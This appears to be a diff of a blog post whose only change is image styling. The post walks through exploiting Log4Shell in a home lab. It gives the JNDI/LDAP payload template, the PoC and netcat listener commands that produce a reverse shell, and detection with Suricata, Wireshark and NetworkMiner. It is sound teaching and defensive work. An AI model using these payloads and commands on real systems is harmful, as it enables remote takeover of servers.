@@ -64,7 +64,7 @@ Log4j 2 is a Java-based logging framework and utility that is used to log messag
 
 **JNDI (Java Naming and Directory Interface)** is an application programming interface (API) that provides naming and directory functionality to applications written using Java Programming Language.
 
-![](/01_jndi_diagram.jpeg){: width="700" height="400" }
+![](/01_jndi_diagram.jpeg){: width="700" height="400" }{: .shadow }
 _Figure 1: JNDI Diagram_
 ## How does JNDI and LDAP Interact:
 JNDI provides a standard API for interacting with name and directory services using a **service provider interface (SPI)** as shown in the diagram above. JNDI provides Java applications and objects with an interface to access directory services like LDAP. More information can be found on [Oracle’s JNDI Implementor Guidelines for LDAP Service Providers](https://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-ldap-gl.html).
@@ -79,14 +79,14 @@ Log4j provides the ability to perform various kinds of lookups. Lookups allow a 
 
 As seen in **Figure 1**, Log4j uses the JNDI API to interact with various naming and directory services such as: LDAP, DNS(Domain Name Service), NIS (Network Information Service), etc. If this functionality is being used you should see this line of code somewhere: **${jndi:logging/context-name}**. “:logging” specifies that the logging protocol is being targeted by JNDI, but other protocols (such as LDAP, RMI, DNS, etc) can be substituted as seen later in this document.  Below is a diagram of a normal Log4j Lookup.
 
-![](/02_Normal_log4j_request.png){: width="700" height="400" }
+![](/02_Normal_log4j_request.png){: width="700" height="400" }{: .shadow }
 _Figure 2: Normal Log4J Request_
 ## Malicious Log4j Lookup:
 An attacker who can control log messages or log messages parameters can execute arbitrary code on the vulnerable server loaded from LDAP servers when message lookup substitution is enabled. As a result, an attacker can craft a special request that would make the utility remotely downloaded and execute the payload.
 
 Below is the most common example of it using the combination of JNDI and LDAP: `${jndi:ldap://<host>:<port>/<payload>}`
 
-![](/03-Malicious_Log4j_request.png){: width="700" height="400" }
+![](/03-Malicious_Log4j_request.png){: width="700" height="400" }{: .shadow }
 _Figure 3: Malicious Log4j Request_
 ## Log4Shell Exploitation:
 There are several Log4Shell POCs on GitHub now.  For this particular example, we will be using [Kozmer’s POC](https://github.com/kozmer/log4j-shell-poc).  The setup is pretty straightforward.  Requirements will be a laptop or Macbook with some type of virtualization software installed, one Kali VM, and one Ubuntu VM with Docker installed.
@@ -113,7 +113,7 @@ docker run --network host log4j-shell-poc
 ```
 You may need to run **sudo** in front of both commands depending on the level or permissions your default ubuntu account has. If successful you should see this by navigating to **localhost:8080** in the web browser:
 
-![](/04-Testing_Ubuntu_server.png){: width="700" height="400" }
+![](/04-Testing_Ubuntu_server.png){: width="700" height="400" }{: .shadow }
 _Figure 4: Testing to see if Ubuntu Server is Up_
 ### Setting up the Attacker Server(Kali VM):
 To start out, let's switch to root:
@@ -130,7 +130,7 @@ And download one of the earlier version of Java 8: **java-8u20**
 
 To download the java version you will need to create an account with Oracle.  Once you download the Java version, we need to unzip the file and move the **jdk1.8.0_202** file into the `usr/bin/`{: .filepath} directory.
 
-![](/05-Moving_vuln_java_library.png){: width="700" height="400" }
+![](/05-Moving_vuln_java_library.png){: width="700" height="400" }{: .shadow }
 _Figure 5: Moving Java Library to Folder of Interest_
 Now that we have done that, we need to navigate to the **log4j-shell-poc** folder located wherever you unzipped it to.
 
@@ -145,46 +145,46 @@ and change each section that contains `./jdk1.8.2.20/`{: filepath} to `/usr/bin/
 > Note: if you don’t have gedit installed, Kali will prompt you to install, you can just hit Y to do so.
 {: .prompt-info}
 
-![](/06-Poc_py_edit.png){: width="700" height="400" }
+![](/06-Poc_py_edit.png){: width="700" height="400" }{: .shadow }
 _Figure 6: Editing POC.py file_
 If done successfully, your file should look like this:
 
-![](/07-What_edited_poc_file_should_look_like.png){: width="700" height="400" }
+![](/07-What_edited_poc_file_should_look_like.png){: width="700" height="400" }{: .shadow }
 _Figure 7: What POC.py file should look like_
 We are now ready to start the attack on the vulnerable Ubuntu server.  First things first, navigate to the Ubuntu machine IP on port 8080 in a browser:
 
-![](/08-Testing_Ubuntu_server.png){: width="700" height="400" }
+![](/08-Testing_Ubuntu_server.png){: width="700" height="400" }{: .shadow }
 _Figure *: Checking to see if we can access Ubuntu server from Kali VM_
 Next in a new terminal tab on Kali, start a netcat listening session:
 ```bash
  nc -lvp 9001
  ```
-![](/09-image_log4shell.png){: width="700" height="400" }
+![](/09-image_log4shell.png){: width="700" height="400" }{: .shadow }
 _Figure 9: Starting netcat listener_
 Then in the original terminal session(**In the log4j-shell-poc folder**), type:
 ```bash
 python poc.py --user_ip {ip_of_kali_vm} --webport 8000 --lport 9001
 ```
 
-![](/10-First_launching_poc_py_file.png){: width="700" height="400" }
+![](/10-First_launching_poc_py_file.png){: width="700" height="400" }{: .shadow }
 _Figure 10: Starting log4shell POC script_
 Now that we have our attacker LDAP server up and running, we can now input our malicious JNDI query into the web server which was provided when we ran the python command above. 
 > Look for the JNDI query next to 'Send me':
 {: .prompt-tip}
 
-![](/11-Inputing_malicious_JNDI_query.png){: width="700" height="400" }
+![](/11-Inputing_malicious_JNDI_query.png){: width="700" height="400" }{: .shadow }
 _Figure 11: Inputing Malicious JNDI query_
 You should now see this in our POC script terminal session:
 
-![](/12-Poc_py_file_running.png){: width="700" height="400" }
+![](/12-Poc_py_file_running.png){: width="700" height="400" }{: .shadow }
 _Figure 12: Showing POC script running successfully_
 In figure 12, we can see that the exploit was successful.  The vulnerable web server queried our malicious LDAP server which then served the malicious `Exploit.class` file.  Within this .class file is a reverse shell payload that will attempt to connect to our netcat listener.
 
-![](/13-Starting_netcat_listener.png){: width="700" height="400" }
+![](/13-Starting_netcat_listener.png){: width="700" height="400" }{: .shadow }
 _Figure 13: Showing Reverse Shell via netcat Listener_
 Now that we have a reverse shell on the victim web server we can download additional payloads, exile data, do whatever we want on the system.
 
-![](/14-Showing_ability_to_download_files_from_internet.png){: width="700" height="400" }
+![](/14-Showing_ability_to_download_files_from_internet.png){: width="700" height="400" }{: .shadow }
 _Figure 14: Showing Ability to Download Files from Internet_
 I've also recorded the session to show what it looks like in real time:
 
@@ -206,17 +206,17 @@ Given the severity of this vulnerability, leveraging high fidelity ways of detec
 ### Suricata:
 We can use open source IDS/IPS rulesets to see what rules fire when we replay traffic through a tool such as Security Onion.  In the screenshot below, I uploaded a PCAP I capture of attacking our victim Ubuntu machine.  Below, we can see several rules that fire based off of this activity. 
 
-![](/15-image_log4shell.png){: width="700" height="400" }
+![](/15-image_log4shell.png){: width="700" height="400" }{: .shadow }
 _Figure 15: Security Onion Screenshot showing Suricata rules triggered by POC_
 ### Wireshark
 In the same vein, when we take a look at the raw PCAP data in our Wireshark session we can follow the TCP stream and see the malicious Log4Shell attempt in the `uname` field highlighted below:
 
-![](/16-image_log4shell.png){: width="700" height="400" }
+![](/16-image_log4shell.png){: width="700" height="400" }{: .shadow }
 _Figure 16: Showing PCAP in Wireshark_
 ### NetworkMiner:
 Lastly, another great tool that you can leverage to examine potential attacking/malicious PCAP traffic is NetworkMiner.  NetworkMiner is great at parsing out data of interest in a PCAP capture that you can quickly identify.  In the screenshots below, I have the attack data of interest highlighted.  We can see the JNDI query in the `uname` field again, just like in Wireshark. In addition to that, we can also see the subsequent `wget` command I used in the video to pull the index.html file of Google main page. In an actual successful attack, you would likely see some kind of attempt to download an additional payload to the server.  `Wget` is probably the most common way to do so and is also pre-installed on most Linux distros.  Because of this an attacker can be “living off the land” when performing the initial compromise of a device.  This is because you might see legit usage of `wget` to install/update legitimate packages.
 
-![](/17-image_log4shell.png){: width="700" height="400" }
+![](/17-image_log4shell.png){: width="700" height="400" }{: .shadow }
 _Figure 17: Showing NetworkMiner Capture_
 
 ## Final Thoughts:
@@ -224,7 +224,7 @@ Hopefully you found this walkthrough useful.  There are various other things tha
 
 You might also way to see what attacks are happening in the wild.  A great way to do that is using a HoneyPot.  Thomas Spatzke's [Log4Pot](https://github.com/thomaspatzke/Log4Pot) is awesome for this.  You could also install [T-Pot](https://github.com/telekom-security/tpotce) which also has Log4Pot included in one of the deployments. 
 
-![](/18-Log4Pot-Dashboard.png){: width="700" height="400" }
+![](/18-Log4Pot-Dashboard.png){: width="700" height="400" }{: .shadow }
 _Figure 18: Log4Pot Dashboard_
 
 You can follow me on [Twitter](https://twitter.com/jt_dunnski) where I'll be sharing when I upload new posts.
